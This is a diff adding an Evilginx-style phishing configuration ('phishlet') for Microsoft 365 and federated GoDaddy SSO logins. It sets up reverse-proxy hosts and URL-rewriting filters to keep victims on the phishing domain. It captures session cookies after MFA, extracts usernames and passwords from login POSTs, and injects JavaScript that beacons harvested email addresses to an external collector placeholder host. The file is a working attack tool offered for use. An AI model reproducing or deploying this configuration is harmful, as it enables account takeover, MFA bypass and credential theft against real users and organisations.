@@ -1,0 +1,312 @@
+min_ver: '3.0.0'
+redirect_url: 'https://www.office.com'
+
+# ============================================================
+# PROXY HOSTS – Every domain the Microsoft login flow touches
+# ============================================================
+proxy_hosts:
+  # Primary Microsoft login page
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+
+  # Azure AD CDN (JavaScript, CSS, images)
+  - phish_sub: 'aadcdn'
+    orig_sub: 'aadcdn'
+    domain: 'msauth.net'
+    session: false
+    is_landing: false
+    auto_filter: true
+
+  # Secondary CDN mirror
+  - phish_sub: 'aadcdn'
+    orig_sub: 'aadcdn'
+    domain: 'msftauth.net'
+    session: false
+    is_landing: false
+    auto_filter: true
+
+  # Microsoft consumer / legacy authentication
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'live.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+
+  # Office.com portal redirect
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'office.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+
+  # Microsoft account login
+  - phish_sub: 'account'
+    orig_sub: 'account'
+    domain: 'microsoft.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+
+  # Teams / additional CDN
+  - phish_sub: 'statics'
+    orig_sub: 'statics'
+    domain: 'teams.microsoft.com'
+    session: false
+    is_landing: false
+    auto_filter: true
+
+  # ========== FEDERATED IDP SUPPORT ==========
+  # GoDaddy SSO (add more IdPs as needed)
+  - phish_sub: 'sso'
+    orig_sub: 'sso'
+    domain: 'godaddy.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+
+  # Okta SSO (uncomment and modify if your target uses Okta)
+  # - phish_sub: 'mycompany'
+  #   orig_sub: 'mycompany'
+  #   domain: 'okta.com'
+  #   session: true
+  #   is_landing: false
+  #   auto_filter: true
+
+  # Google Workspace SSO (uncomment if needed)
+  # - phish_sub: 'accounts'
+  #   orig_sub: 'accounts'
+  #   domain: 'google.com'
+  #   session: true
+  #   is_landing: false
+  #   auto_filter: true
+
+# ============================================================
+# SUB FILTERS – Brutal URL rewriting to keep victim in proxy
+# ============================================================
+sub_filters:
+  # ---- Microsoft Online ----
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'login.microsoftonline.com'
+    replace: 'login.{PHISH_DOMAIN}'
+    mimes: ['text/html', 'application/javascript', 'application/json', 'application/xml', 'text/css']
+
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'microsoftonline.com'
+    replace: '{PHISH_DOMAIN}'
+    mimes: ['application/javascript', 'application/json']
+
+  # ---- Azure AD CDN ----
+  - triggers_on: 'aadcdn.msauth.net'
+    orig_sub: 'aadcdn'
+    domain: 'msauth.net'
+    search: 'aadcdn.msauth.net'
+    replace: 'aadcdn.{PHISH_DOMAIN}'
+    mimes: ['application/javascript', 'text/html', 'application/json']
+
+  - triggers_on: 'aadcdn.msftauth.net'
+    orig_sub: 'aadcdn'
+    domain: 'msftauth.net'
+    search: 'aadcdn.msftauth.net'
+    replace: 'aadcdn.{PHISH_DOMAIN}'
+    mimes: ['application/javascript', 'text/html']
+
+  # ---- Live.com ----
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: 'login.live.com'
+    replace: 'login.{PHISH_DOMAIN}'
+    mimes: ['text/html', 'application/javascript', 'application/json']
+
+  # ---- Office.com ----
+  - triggers_on: 'www.office.com'
+    orig_sub: 'www'
+    domain: 'office.com'
+    search: 'www.office.com'
+    replace: 'www.{PHISH_DOMAIN}'
+    mimes: ['text/html', 'application/javascript']
+
+  # ---- GoDaddy SSO ----
+  - triggers_on: 'sso.godaddy.com'
+    orig_sub: 'sso'
+    domain: 'godaddy.com'
+    search: 'sso.godaddy.com'
+    replace: 'sso.{PHISH_DOMAIN}'
+    mimes: ['text/html', 'application/javascript', 'application/json']
+
+  - triggers_on: 'sso.godaddy.com'
+    orig_sub: 'sso'
+    domain: 'godaddy.com'
+    search: 'godaddy.com'
+    replace: '{PHISH_DOMAIN}'
+    mimes: ['application/javascript', 'application/json']
+
+  # ---- Generic catch‑all for any remaining real domains ----
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'https://login.microsoftonline.com'
+    replace: 'https://login.{PHISH_DOMAIN}'
+    mimes: ['text/html', 'application/javascript', 'application/json']
+
+# ============================================================
+# AUTH TOKENS – Session cookies captured AFTER MFA
+# ============================================================
+auth_tokens:
+  # Primary: caught after MFA on the Microsoft Online domain
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+
+  # Secondary: sometimes the final cookie appears under office.com
+  - domain: '.office.com'
+    keys: ['RPSAuth', 'WLSSC']
+
+  # Legacy: consumer accounts may set under live.com
+  - domain: '.live.com'
+    keys: ['WLSSC']
+
+  # GoDaddy: if federated, sometimes a state cookie is set here too
+  - domain: '.godaddy.com'
+    keys: ['SSOID', 'GDSSO']
+
+# ============================================================
+# CREDENTIALS – Extracts username + password from POST body
+# ============================================================
+credentials:
+  # Microsoft primary form fields
+  - username:
+      key: 'login'
+      search: '(.*)'
+      type: 'post'
+    password:
+      key: 'passwd'
+      search: '(.*)'
+      type: 'post'
+
+  # Alternative field names (Microsoft sometimes uses these)
+  - username:
+      key: 'loginfmt'
+      search: '(.*)'
+      type: 'post'
+    password:
+      key: 'passwd'
+      search: '(.*)'
+      type: 'post'
+
+  # GoDaddy SSO field names
+  - username:
+      key: 'username'
+      search: '(.*)'
+      type: 'post'
+    password:
+      key: 'password'
+      search: '(.*)'
+      type: 'post'
+
+  # Okta field names (uncomment if using Okta)
+  # - username:
+  #     key: 'username'
+  #     search: '(.*)'
+  #     type: 'post'
+  #   password:
+  #     key: 'password'
+  #     search: '(.*)'
+  #     type: 'post'
+
+# ============================================================
+# LOGIN – The first page the victim sees
+# ============================================================
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+# ============================================================
+# JAVASCRIPT INJECTION – Email prefill + autograb beacon
+# ============================================================
+js_inject:
+  # ---- Inject into the email‑input page ----
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    path: '/'
+    script: |
+      (function() {
+        console.log("[*] O365 Advanced Phishlet: prefill & autograb active.");
+
+        // ================ COLLECTOR CONFIGURATION ================
+        // CHANGE THIS to your external collector URL.
+        // This receives the autograb beacons.
+        var COLLECTOR = 'https://your-collector.example.com/grab';
+        // ==========================================================
+
+        // Helper: send data via image beacon (no CORS issues)
+        function beacon(data) {
+          var img = new Image();
+          img.src = COLLECTOR + '?' + (function(obj){
+            var str = [];
+            for (var p in obj)
+              if (obj.hasOwnProperty(p))
+                str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
+            return str.join("&");
+          })(data);
+        }
+
+        // Helper: find the email input field (Microsoft uses multiple selectors)
+        function findEmailField() {
+          return document.querySelector(
+            'input[type="email"], input[name="loginfmt"], input[name="login"], input#i0116'
+          );
+        }
+
+        // ===== 1. PREFILL from ?email= parameter =====
+        function getQueryParam(name) {
+          name = name.replace(/[\[\]]/g, "\\$&");
+          var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+              results = regex.exec(window.location.href);
+          if (!results) return null;
+          if (!results[2]) return '';
+          return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        var prefillEmail = getQueryParam('email');
+        if (prefillEmail && prefillEmail.includes('@')) {
+          var emailField = findEmailField();
+          if (emailField) {
+            emailField.value = prefillEmail;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+            emailField.dispatchEvent(new Event('change', { bubbles: true }));
+            console.log("[*] Prefilled email from URL: " + prefillEmail);
+          }
+        }
+
+        // ===== 2. AUTOGRAB – beacon any autofilled email =====
+        var emailGrabbed = false;
+        function grabEmail() {
+          if (emailGrabbed) return;
+          var field = findEmailField();
+          if (field && field.value && field.value.includes('@')) {
+            beacon({ email: field.value, type: 'autograb', source: 'o365-phishlet' });
+            console.log("[*] Autograb beacon sent: " + field.value);
+            emailGrabbed = true;
+            clearInterval(grabInterval);
+          }
+        }
+
+        // Check immediately and every 500ms
+        grabEmail();
+        var grabInterval = setInterval(grabEmail, 500);
+
+        // Stop after 10 seconds to avoid endless polling
+        setTimeout(function() { clearInterval(grabInterval); }, 10000);
+
+      })();
